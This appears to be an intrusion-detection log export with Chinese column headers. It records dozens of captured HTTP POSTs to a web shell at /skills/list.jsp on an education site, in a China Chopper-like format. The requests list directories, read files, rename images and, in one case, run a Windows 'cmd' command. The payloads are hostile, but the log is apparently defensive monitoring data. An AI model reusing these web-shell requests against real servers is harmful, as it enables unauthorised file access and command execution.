 出入口	事件名	源IP	目的IP	源端口	目的端口	时间	设备名称	返回值 
未知, id=0	00002787	172.97.184.205	118.114.242.106	60568	1080	20160421032814	广州电信同和_53_114_129	r=POST /skills/list.jsp HTTP/1.1\0D\0AX-Forwarded-For: 199.1.88.29\0D\0AReferer: http://course.stfi.cn\0D\0AContent-Type: application/x-www-form-urlencoded\0D\0AUser-Agent: Mozilla/5.0 (Windows; Windows NT 5.1; en-US) Firefox/3.5.0\0D\0AHost: course.stfi.cn\0D\0AContent-Length: 85\0D\0ACache-Control: no-cache\0D\0ACookie: JSESSIONID=B572906DD191A6E542C8004420B28599\0D\0A\0D\0Apwdpwd=B&z0=GB2312&z1=E%3A%5C%5Cdms%5C%5Cweb%5C%5Cskills%5C%5CWEB-INF%5C%5Cconf%5C%5C
未知, id=0	00002787	172.97.184.205	118.114.242.106	60568	1080	20160421032819	广州电信同和_53_114_129	r=POST /skills/list.jsp HTTP/1.1\0D\0AX-Forwarded-For: 199.1.88.29\0D\0AReferer: http://course.stfi.cn\0D\0AContent-Type: application/x-www-form-urlencoded\0D\0AUser-Agent: Mozilla/5.0 (Windows; Windows NT 5.1; en-US) Firefox/3.5.0\0D\0AHost: course.stfi.cn\0D\0AContent-Length: 84\0D\0ACache-Control: no-cache\0D\0ACookie: JSESSIONID=B572906DD191A6E542C8004420B28599\0D\0A\0D\0Apwdpwd=B&z0=GB2312&z1=E%3A%5C%5Cdms%5C%5Cweb%5C%5Cskills%5C%5CWEB-INF%5C%5Clib%5C%5C
未知, id=0	00002787	172.97.184.205	118.114.242.106	60568	1080	20160421032820	广州电信同和_53_114_129	r=POST /skills/list.jsp HTTP/1.1\0D\0AX-Forwarded-For: 199.1.88.29\0D\0AReferer: http://course.stfi.cn\0D\0AContent-Type: application/x-www-form-urlencoded\0D\0AUser-Agent: Mozilla/5.0 (Windows; Windows NT 5.1; en-US) Firefox/3.5.0\0D\0AHost: course.stfi.cn\0D\0AContent-Length: 84\0D\0ACache-Control: no-cache\0D\0ACookie: JSESSIONID=B572906DD191A6E542C8004420B28599\0D\0A\0D\0Apwdpwd=B&z0=GB2312&z1=E%3A%5C%5Cdms%5C%5Cweb%5C%5Cskills%5C%5CWEB-INF%5C%5Clib%5C%5C
未知, id=0	00002787	172.97.184.205	118.114.242.106	60568	1080	20160421032840	广州电信同和_53_114_129	r=POST /skills/list.jsp HTTP/1.1\0D\0AX-Forwarded-For: 199.1.88.29\0D\0AReferer: http://course.stfi.cn\0D\0AContent-Type: application/x-www-form-urlencoded\0D\0AUser-Agent: Mozilla/5.0 (Windows; Windows NT 5.1; en-US) Firefox/3.5.0\0D\0AHost: course.stfi.cn\0D\0AContent-Length: 84\0D\0ACache-Control: no-cache\0D\0ACookie: JSESSIONID=B572906DD191A6E542C8004420B28599\0D\0A\0D\0Apwdpwd=B&z0=GB2312&z1=E%3A%5C%5Cdms%5C%5Cweb%5C%5Cskills%5C%5Cimages%5C%5Cjpkc%5C%5C
未知, id=0	00002787	172.97.184.205	118.114.242.106	60568	1080	20160421032858	广州电信同和_53_114_129	r=POST /skills/list.jsp HTTP/1.1\0D\0AX-Forwarded-For: 199.1.88.29\0D\0AReferer: http://course.stfi.cn\0D\0AContent-Type: application/x-www-form-urlencoded\0D\0AUser-Agent: Mozilla/5.0 (Windows; Windows NT 5.1; en-US) Firefox/3.5.0\0D\0AHost: course.stfi.cn\0D\0AContent-Length: 77\0D\0ACache-Control: no-cache\0D\0ACookie: JSESSIONID=B572906DD191A6E542C8004420B28599\0D\0A\0D\0Apwdpwd=B&z0=GB2312&z1=E%3A%5C%5Cdms%5C%5Cweb%5C%5Cskills%5C%5Cresources%5C%5C
未知, id=0	00002787	172.97.184.205	118.114.242.106	60568	1080	20160421032906	广州电信同和_53_114_129	r=POST /skills/list.jsp HTTP/1.1\0D\0AX-Forwarded-For: 199.1.88.29\0D\0AReferer: http://course.stfi.cn\0D\0AContent-Type: application/x-www-form-urlencoded\0D\0AUser-Agent: Mozilla/5.0 (Windows; Windows NT 5.1; en-US) Firefox/3.5.0\0D\0AHost: course.stfi.cn\0D\0AContent-Length: 88\0D\0ACache-Control: no-cache\0D\0ACookie: JSESSIONID=B572906DD191A6E542C8004420B28599\0D\0A\0D\0Apwdpwd=B&z0=GB2312&z1=E%3A%5C%5Cdms%5C%5Cweb%5C%5Cskills%5C%5CWEB-INF%5C%5Cupgrade%5C%5C
未知, id=0	00002787	172.97.184.205	118.114.242.106	60581	1080	20160421033445	广州电信同和_53_114_105	r=POST /skills/list.jsp HTTP/1.1\0D\0AX-Forwarded-For: 199.1.88.29\0D\0AReferer: http://course.stfi.cn\0D\0AContent-Type: application/x-www-form-urlencoded\0D\0AUser-Agent: Mozilla/5.0 (Windows; Windows NT 5.1; en-US) Firefox/3.5.0\0D\0AHost: course.stfi.cn\0D\0AContent-Length: 90\0D\0ACache-Control: no-cache\0D\0ACookie: JSESSIONID=B572906DD191A6E542C8004420B28599\0D\0A\0D\0Apwdpwd=C&z0=GB2312&z1=E%3A%5C%5Cdms%5C%5Cweb%5C%5Cskills%5C%5CWEB-INF%5C%5Cstruts-html.tld
未知, id=0	00002787	172.97.184.205	118.114.242.106	60584	1080	20160421033648	广州电信同和_53_114_103	r=POST /skills/list.jsp HTTP/1.1\0D\0AX-Forwarded-For: 199.1.88.29\0D\0AReferer: http://course.stfi.cn\0D\0AContent-Type: application/x-www-form-urlencoded\0D\0AUser-Agent: Mozilla/5.0 (Windows; Windows NT 5.1; en-US) Firefox/3.5.0\0D\0AHost: course.stfi.cn\0D\0AContent-Length: 76\0D\0ACache-Control: no-cache\0D\0ACookie: JSESSIONID=B572906DD191A6E542C8004420B28599\0D\0A\0D\0Apwdpwd=B&z0=GB2312&z1=E%3A%5C%5Cdms%5C%5Cweb%5C%5Cskills%5C%5Ctemplate%5C%5C
未知, id=0	00002787	172.97.184.205	118.114.242.106	60584	1080	20160421033716	广州电信同和_53_114_103	r=POST /skills/list.jsp HTTP/1.1\0D\0AX-Forwarded-For: 199.1.88.29\0D\0AReferer: http://course.stfi.cn\0D\0AContent-Type: application/x-www-form-urlencoded\0D\0AUser-Agent: Mozilla/5.0 (Windows; Windows NT 5.1; en-US) Firefox/3.5.0\0D\0AHost: course.stfi.cn\0D\0AContent-Length: 60\0D\0ACache-Control: no-cache\0D\0ACookie: JSESSIONID=B572906DD191A6E542C8004420B28599\0D\0A\0D\0Apwdpwd=B&z0=GB2312&z1=E%3A%5C%5Cdms%5C%5Cweb%5C%5Chtml%5C%5C
未知, id=0	00002787	172.97.184.205	118.114.242.106	60584	1080	20160421033808	广州电信同和_53_114_103	r=POST /skills/list.jsp HTTP/1.1\0D\0AX-Forwarded-For: 199.1.88.29\0D\0AReferer: http://course.stfi.cn\0D\0AContent-Type: application/x-www-form-urlencoded\0D\0AUser-Agent: Mozilla/5.0 (Windows; Windows NT 5.1; en-US) Firefox/3.5.0\0D\0AHost: course.stfi.cn\0D\0AContent-Length: 72\0D\0ACache-Control: no-cache\0D\0ACookie: JSESSIONID=B572906DD191A6E542C8004420B28599\0D\0A\0D\0Apwdpwd=B&z0=GB2312&z1=E%3A%5C%5Cdms%5C%5Cweb%5C%5Cskills%5C%5Cjpkc%5C%5C
未知, id=0	00002787	172.97.184.205	118.114.242.106	60584	1080	20160421033828	广州电信同和_53_114_103	r=POST /skills/list.jsp HTTP/1.1\0D\0AX-Forwarded-For: 199.1.88.29\0D\0AReferer: http://course.stfi.cn\0D\0AContent-Type: application/x-www-form-urlencoded\0D\0AUser-Agent: Mozilla/5.0 (Windows; Windows NT 5.1; en-US) Firefox/3.5.0\0D\0AHost: course.stfi.cn\0D\0AContent-Length: 75\0D\0ACache-Control: no-cache\0D\0ACookie: JSESSIONID=B572906DD191A6E542C8004420B28599\0D\0A\0D\0Apwdpwd=B&z0=GB2312&z1=E%3A%5C%5Cdms%5C%5Cweb%5C%5Csuite%5C%5Ctemplate%5C%5C
未知, id=0	00002787	172.97.184.205	118.114.242.106	60584	1080	20160421033828	广州电信同和_53_114_103	r=POST /skills/list.jsp HTTP/1.1\0D\0AX-Forwarded-For: 199.1.88.29\0D\0AReferer: http://course.stfi.cn\0D\0AContent-Type: application/x-www-form-urlencoded\0D\0AUser-Agent: Mozilla/5.0 (Windows; Windows NT 5.1; en-US) Firefox/3.5.0\0D\0AHost: course.stfi.cn\0D\0AContent-Length: 75\0D\0ACache-Control: no-cache\0D\0ACookie: JSESSIONID=B572906DD191A6E542C8004420B28599\0D\0A\0D\0Apwdpwd=B&z0=GB2312&z1=E%3A%5C%5Cdms%5C%5Cweb%5C%5Csuite%5C%5Ctemplate%5C%5C
未知, id=0	00002787	172.97.184.205	118.114.242.106	60584	1080	20160421033833	广州电信同和_53_114_103	r=POST /skills/list.jsp HTTP/1.1\0D\0AX-Forwarded-For: 199.1.88.29\0D\0AReferer: http://course.stfi.cn\0D\0AContent-Type: application/x-www-form-urlencoded\0D\0AUser-Agent: Mozilla/5.0 (Windows; Windows NT 5.1; en-US) Firefox/3.5.0\0D\0AHost: course.stfi.cn\0D\0AContent-Length: 85\0D\0ACache-Control: no-cache\0D\0ACookie: JSESSIONID=B572906DD191A6E542C8004420B28599\0D\0A\0D\0Apwdpwd=B&z0=GB2312&z1=E%3A%5C%5Cdms%5C%5Cweb%5C%5Csuite%5C%5Ctemplate%5C%5Csite%5C%5C
未知, id=0	00002787	172.97.184.205	118.114.242.106	60584	1080	20160421033844	广州电信同和_53_114_103	r=POST /skills/list.jsp HTTP/1.1\0D\0AX-Forwarded-For: 199.1.88.29\0D\0AReferer: http://course.stfi.cn\0D\0AContent-Type: application/x-www-form-urlencoded\0D\0AUser-Agent: Mozilla/5.0 (Windows; Windows NT 5.1; en-US) Firefox/3.5.0\0D\0AHost: course.stfi.cn\0D\0AContent-Length: 96\0D\0ACache-Control: no-cache\0D\0ACookie: JSESSIONID=B572906DD191A6E542C8004420B28599\0D\0A\0D\0Apwdpwd=B&z0=GB2312&z1=E%3A%5C%5Cdms%5C%5Cweb%5C%5Csuite%5C%5Ctemplate%5C%5Csite%5C%5Cstyle%5C%5C
未知, id=0	00002787	172.97.184.205	118.114.242.106	60584	1080	20160421033850	广州电信同和_53_114_103	r=POST /skills/list.jsp HTTP/1.1\0D\0AX-Forwarded-For: 199.1.88.29\0D\0AReferer: http://course.stfi.cn\0D\0AContent-Type: application/x-www-form-urlencoded\0D\0AUser-Agent: Mozilla/5.0 (Windows; Windows NT 5.1; en-US) Firefox/3.5.0\0D\0AHost: course.stfi.cn\0D\0AContent-Length: 107\0D\0ACache-Control: no-cache\0D\0ACookie: JSESSIONID=B572906DD191A6E542C8004420B28599\0D\0A\0D\0Apwdpwd=B&z0=GB2312&z1=E%3A%5C%5Cdms%5C%5Cweb%5C%5Csuite%5C%5Ctemplate%5C%5Csite%5C%5Cstyle%5C%5Cskin1%5C%5C
未知, id=0	00002787	172.97.184.205	118.114.242.106	60584	1080	20160421033938	广州电信同和_53_114_103	r=POST /skills/list.jsp HTTP/1.1\0D\0AX-Forwarded-For: 199.1.88.29\0D\0AReferer: http://course.stfi.cn\0D\0AContent-Type: application/x-www-form-urlencoded\0D\0AUser-Agent: Mozilla/5.0 (Windows; Windows NT 5.1; en-US) Firefox/3.5.0\0D\0AHost: course.stfi.cn\0D\0AContent-Length: 153\0D\0ACache-Control: no-cache\0D\0ACookie: JSESSIONID=B572906DD191A6E542C8004420B28599\0D\0A\0D\0Apwdpwd=M&z0=GB2312&z1=/ccmd&z2=cd+%2Fd+%22E%3A%5Cdms%5Cweb%5Csuite%5Cskills%5C%22%26dir+%2Fs+%2Fb+e%3A%5Clogo_jpkc.jpg%26echo+%5BS%5D%26cd%26echo+%5BE%5D
未知, id=0	00002787	172.97.184.205	118.114.242.106	60584	1080	20160421034043	广州电信同和_53_114_103	r=POST /skills/list.jsp HTTP/1.1\0D\0AX-Forwarded-For: 199.1.88.29\0D\0AReferer: http://course.stfi.cn\0D\0AContent-Type: application/x-www-form-urlencoded\0D\0AUser-Agent: Mozilla/5.0 (Windows; Windows NT 5.1; en-US) Firefox/3.5.0\0D\0AHost: course.stfi.cn\0D\0AContent-Length: 112\0D\0ACache-Control: no-cache\0D\0ACookie: JSESSIONID=B572906DD191A6E542C8004420B28599\0D\0A\0D\0Apwdpwd=B&z0=GB2312&z1=e%3A%5C%5Cdms%5C%5Cres%5C%5Cskills%5C%5Cpersonal-resource%5C%5C815%5C%5C%CD%BC%C6%AC%5C%5C
未知, id=0	00002787	172.97.184.205	118.114.242.106	60584	1080	20160421034104	广州电信同和_53_114_103	r=POST /skills/list.jsp HTTP/1.1\0D\0AX-Forwarded-For: 199.1.88.29\0D\0AReferer: http://course.stfi.cn\0D\0AContent-Type: application/x-www-form-urlencoded\0D\0AUser-Agent: Mozilla/5.0 (Windows; Windows NT 5.1; en-US) Firefox/3.5.0\0D\0AHost: course.stfi.cn\0D\0AContent-Length: 17\0D\0ACache-Control: no-cache\0D\0ACookie: JSESSIONID=B572906DD191A6E542C8004420B28599\0D\0A\0D\0Apwdpwd=A&z0=UTF-8
未知, id=0	00002787	172.97.184.205	118.114.242.106	60584	1080	20160421034104	广州电信同和_53_114_103	r=POST /skills/list.jsp HTTP/1.1\0D\0AX-Forwarded-For: 199.1.88.29\0D\0AReferer: http://course.stfi.cn\0D\0AContent-Type: application/x-www-form-urlencoded\0D\0AUser-Agent: Mozilla/5.0 (Windows; Windows NT 5.1; en-US) Firefox/3.5.0\0D\0AHost: course.stfi.cn\0D\0AContent-Length: 130\0D\0ACache-Control: no-cache\0D\0ACookie: JSESSIONID=B572906DD191A6E542C8004420B28599\0D\0A\0D\0Apwdpwd=B&z0=UTF-8&z1=E%3A%5C%5Cdms%5C%5Cbin%5C%5Ctomcat%5C%5Cwebapps%5C%5C..%5C%5C..%5C%5C..%5C%5Cweb%5C%5Csuite%5C%5Cskills%5C%5C
未知, id=0	00002787	172.97.184.205	118.114.242.106	60584	1080	20160421034116	广州电信同和_53_114_103	r=POST /skills/list.jsp HTTP/1.1\0D\0AX-Forwarded-For: 199.1.88.29\0D\0AReferer: http://course.stfi.cn\0D\0AContent-Type: application/x-www-form-urlencoded\0D\0AUser-Agent: Mozilla/5.0 (Windows; Windows NT 5.1; en-US) Firefox/3.5.0\0D\0AHost: course.stfi.cn\0D\0AContent-Length: 117\0D\0ACache-Control: no-cache\0D\0ACookie: JSESSIONID=B572906DD191A6E542C8004420B28599\0D\0A\0D\0Apwdpwd=B&z0=UTF-8&z1=e%3A%5C%5Cdms%5C%5Cres%5C%5Cskills%5C%5Cpersonal-resource%5C%5C815%5C%5C%E5%9B%BE%E7%89%87%5C%5C
未知, id=0	00002787	172.97.184.205	118.114.242.106	60584	1080	20160421034127	广州电信同和_53_114_103	r=POST /skills/list.jsp HTTP/1.1\0D\0AX-Forwarded-For: 199.1.88.29\0D\0AReferer: http://course.stfi.cn\0D\0AContent-Type: application/x-www-form-urlencoded\0D\0AUser-Agent: Mozilla/5.0 (Windows; Windows NT 5.1; en-US) Firefox/3.5.0\0D\0AHost: course.stfi.cn\0D\0AContent-Length: 244\0D\0ACache-Control: no-cache\0D\0ACookie: JSESSIONID=B572906DD191A6E542C8004420B28599\0D\0A\0D\0Apwdpwd=I&z0=UTF-8&z1=e%3A%5C%5Cdms%5C%5Cres%5C%5Cskills%5C%5Cpersonal-resource%5C%5C815%5C%5C%E5%9B%BE%E7%89%87%5C%5Clogo_jpkc.jpg&z2=e%3A%5C%5Cdms%5C%5Cres%5C%5Cskills%5C%5Cpersonal-resource%5C%5C815%5C%5C%E5%9B%BE%E7%89%87%5C%5Clogo_jpkc2.jpg
未知, id=0	00002787	172.97.184.205	118.114.242.106	60584	1080	20160421034223	广州电信同和_53_114_103	r=POST /skills/list.jsp HTTP/1.1\0D\0AX-Forwarded-For: 199.1.88.29\0D\0AReferer: http://course.stfi.cn\0D\0AContent-Type: application/x-www-form-urlencoded\0D\0AUser-Agent: Mozilla/5.0 (Windows; Windows NT 5.1; en-US) Firefox/3.5.0\0D\0AHost: course.stfi.cn\0D\0AContent-Length: 117\0D\0ACache-Control: no-cache\0D\0ACookie: JSESSIONID=B572906DD191A6E542C8004420B28599\0D\0A\0D\0Apwdpwd=B&z0=UTF-8&z1=e%3A%5C%5Cdms%5C%5Cres%5C%5Cskills%5C%5Cpersonal-resource%5C%5C815%5C%5C%E5%9B%BE%E7%89%87%5C%5C
未知, id=0	00002787	172.97.184.205	118.114.242.106	60584	1080	20160421034239	广州电信同和_53_114_103	r=POST /skills/list.jsp HTTP/1.1\0D\0AX-Forwarded-For: 199.1.88.29\0D\0AReferer: http://course.stfi.cn\0D\0AContent-Type: application/x-www-form-urlencoded\0D\0AUser-Agent: Mozilla/5.0 (Windows; Windows NT 5.1; en-US) Firefox/3.5.0\0D\0AHost: course.stfi.cn\0D\0AContent-Length: 93\0D\0ACache-Control: no-cache\0D\0ACookie: JSESSIONID=B572906DD191A6E542C8004420B28599\0D\0A\0D\0Apwdpwd=B&z0=UTF-8&z1=E%3A%5C%5Cdms%5C%5Cres%5C%5Cskills%5C%5Cpersonal-resource%5C%5C815%5C%5C
未知, id=0	00002787	172.97.184.205	118.114.242.106	60584	1080	20160421034243	广州电信同和_53_114_103	r=POST /skills/list.jsp HTTP/1.1\0D\0AX-Forwarded-For: 199.1.88.29\0D\0AReferer: http://course.stfi.cn\0D\0AContent-Type: application/x-www-form-urlencoded\0D\0AUser-Agent: Mozilla/5.0 (Windows; Windows NT 5.1; en-US) Firefox/3.5.0\0D\0AHost: course.stfi.cn\0D\0AContent-Length: 103\0D\0ACache-Control: no-cache\0D\0ACookie: JSESSIONID=B572906DD191A6E542C8004420B28599\0D\0A\0D\0Apwdpwd=B&z0=UTF-8&z1=E%3A%5C%5Cdms%5C%5Cres%5C%5Cskills%5C%5Cpersonal-resource%5C%5C815%5C%5Cdata%5C%5C
未知, id=0	00002787	172.97.184.205	118.114.242.106	60584	1080	20160421034246	广州电信同和_53_114_103	r=POST /skills/list.jsp HTTP/1.1\0D\0AX-Forwarded-For: 199.1.88.29\0D\0AReferer: http://course.stfi.cn\0D\0AContent-Type: application/x-www-form-urlencoded\0D\0AUser-Agent: Mozilla/5.0 (Windows; Windows NT 5.1; en-US) Firefox/3.5.0\0D\0AHost: course.stfi.cn\0D\0AContent-Length: 126\0D\0ACache-Control: no-cache\0D\0ACookie: JSESSIONID=B572906DD191A6E542C8004420B28599\0D\0A\0D\0Apwdpwd=B&z0=UTF-8&z1=E%3A%5C%5Cdms%5C%5Cres%5C%5Cskills%5C%5Cpersonal-resource%5C%5C815%5C%5C%E5%9B%BD%E5%AD%A6%E5%A0%82%5C%5C
未知, id=0	00002787	172.97.184.205	118.114.242.106	60584	1080	20160421034248	广州电信同和_53_114_103	r=POST /skills/list.jsp HTTP/1.1\0D\0AX-Forwarded-For: 199.1.88.29\0D\0AReferer: http://course.stfi.cn\0D\0AContent-Type: application/x-www-form-urlencoded\0D\0AUser-Agent: Mozilla/5.0 (Windows; Windows NT 5.1; en-US) Firefox/3.5.0\0D\0AHost: course.stfi.cn\0D\0AContent-Length: 144\0D\0ACache-Control: no-cache\0D\0ACookie: JSESSIONID=B572906DD191A6E542C8004420B28599\0D\0A\0D\0Apwdpwd=B&z0=UTF-8&z1=E%3A%5C%5Cdms%5C%5Cres%5C%5Cskills%5C%5Cpersonal-resource%5C%5C815%5C%5C%E6%A0%A1%E5%9B%AD%E7%BD%91%E5%BB%BA%E8%AE%BE%5C%5C
未知, id=0	00002787	172.97.184.205	118.114.242.106	60584	1080	20160421034250	广州电信同和_53_114_103	r=POST /skills/list.jsp HTTP/1.1\0D\0AX-Forwarded-For: 199.1.88.29\0D\0AReferer: http://course.stfi.cn\0D\0AContent-Type: application/x-www-form-urlencoded\0D\0AUser-Agent: Mozilla/5.0 (Windows; Windows NT 5.1; en-US) Firefox/3.5.0\0D\0AHost: course.stfi.cn\0D\0AContent-Length: 84\0D\0ACache-Control: no-cache\0D\0ACookie: JSESSIONID=B572906DD191A6E542C8004420B28599\0D\0A\0D\0Apwdpwd=B&z0=UTF-8&z1=E%3A%5C%5Cdms%5C%5Cres%5C%5Cskills%5C%5Cpersonal-resource%5C%5C
未知, id=0	00002787	172.97.184.205	118.114.242.106	60591	1080	20160421034434	广州电信天河_53_02_06	r=POST /skills/list.jsp HTTP/1.1\0D\0AX-Forwarded-For: 199.1.88.29\0D\0AReferer: http://course.stfi.cn\0D\0AContent-Type: application/x-www-form-urlencoded\0D\0AUser-Agent: Mozilla/5.0 (Windows; Windows NT 5.1; en-US) Firefox/3.5.0\0D\0AHost: course.stfi.cn\0D\0AContent-Length: 244\0D\0ACache-Control: no-cache\0D\0ACookie: JSESSIONID=B572906DD191A6E542C8004420B28599\0D\0A\0D\0Apwdpwd=I&z0=UTF-8&z1=E%3A%5C%5Cdms%5C%5Cres%5C%5Cskills%5C%5Cpersonal-resource%5C%5C815%5C%5C%E5%9B%BE%E7%89%87%5C%5Clogo_jpkc2.jpg&z2=E%3A%5C%5Cdms%5C%5Cres%5C%5Cskills%5C%5Cpersonal-resource%5C%5C815%5C%5C%E5%9B%BE%E7%89%87%5C%5Clogo_jpkc.jpg
未知, id=0	00002787	172.97.184.205	118.114.242.106	60591	1080	20160421034506	广州电信天河_53_02_06	r=POST /skills/list.jsp HTTP/1.1\0D\0AX-Forwarded-For: 199.1.88.29\0D\0AReferer: http://course.stfi.cn\0D\0AContent-Type: application/x-www-form-urlencoded\0D\0AUser-Agent: Mozilla/5.0 (Windows; Windows NT 5.1; en-US) Firefox/3.5.0\0D\0AHost: course.stfi.cn\0D\0AContent-Length: 49\0D\0ACache-Control: no-cache\0D\0ACookie: JSESSIONID=B572906DD191A6E542C8004420B28599\0D\0A\0D\0Apwdpwd=B&z0=UTF-8&z1=E%3A%5C%5Cdms%5C%5Cres%5C%5C
未知, id=0	00002787	172.97.184.205	118.114.242.106	60591	1080	20160421034526	广州电信天河_53_02_06	r=POST /skills/list.jsp HTTP/1.1\0D\0AX-Forwarded-For: 199.1.88.29\0D\0AReferer: http://course.stfi.cn\0D\0AContent-Type: application/x-www-form-urlencoded\0D\0AUser-Agent: Mozilla/5.0 (Windows; Windows NT 5.1; en-US) Firefox/3.5.0\0D\0AHost: course.stfi.cn\0D\0AContent-Length: 107\0D\0ACache-Control: no-cache\0D\0ACookie: JSESSIONID=B572906DD191A6E542C8004420B28599\0D\0A\0D\0Apwdpwd=B&z0=UTF-8&z1=E%3A%5C%5Cdms%5C%5Cbin%5C%5Ctomcat%5C%5Cwebapps%5C%5C..%5C%5C..%5C%5C..%5C%5Cweb%5C%5C
未知, id=0	00002787	172.97.184.205	118.114.242.106	60591	1080	20160421034528	广州电信天河_53_02_06	r=POST /skills/list.jsp HTTP/1.1\0D\0AX-Forwarded-For: 199.1.88.29\0D\0AReferer: http://course.stfi.cn\0D\0AContent-Type: application/x-www-form-urlencoded\0D\0AUser-Agent: Mozilla/5.0 (Windows; Windows NT 5.1; en-US) Firefox/3.5.0\0D\0AHost: course.stfi.cn\0D\0AContent-Length: 117\0D\0ACache-Control: no-cache\0D\0ACookie: JSESSIONID=B572906DD191A6E542C8004420B28599\0D\0A\0D\0Apwdpwd=B&z0=UTF-8&z1=E%3A%5C%5Cdms%5C%5Cbin%5C%5Ctomcat%5C%5Cwebapps%5C%5C..%5C%5C..%5C%5C..%5C%5Cweb%5C%5Croot%5C%5C
未知, id=0	00002787	172.97.184.205	118.114.242.106	60591	1080	20160421034530	广州电信天河_53_02_06	r=POST /skills/list.jsp HTTP/1.1\0D\0AX-Forwarded-For: 199.1.88.29\0D\0AReferer: http://course.stfi.cn\0D\0AContent-Type: application/x-www-form-urlencoded\0D\0AUser-Agent: Mozilla/5.0 (Windows; Windows NT 5.1; en-US) Firefox/3.5.0\0D\0AHost: course.stfi.cn\0D\0AContent-Length: 127\0D\0ACache-Control: no-cache\0D\0ACookie: JSESSIONID=B572906DD191A6E542C8004420B28599\0D\0A\0D\0Apwdpwd=C&z0=UTF-8&z1=E%3A%5C%5Cdms%5C%5Cbin%5C%5Ctomcat%5C%5Cwebapps%5C%5C..%5C%5C..%5C%5C..%5C%5Cweb%5C%5Croot%5C%5Cindex.html
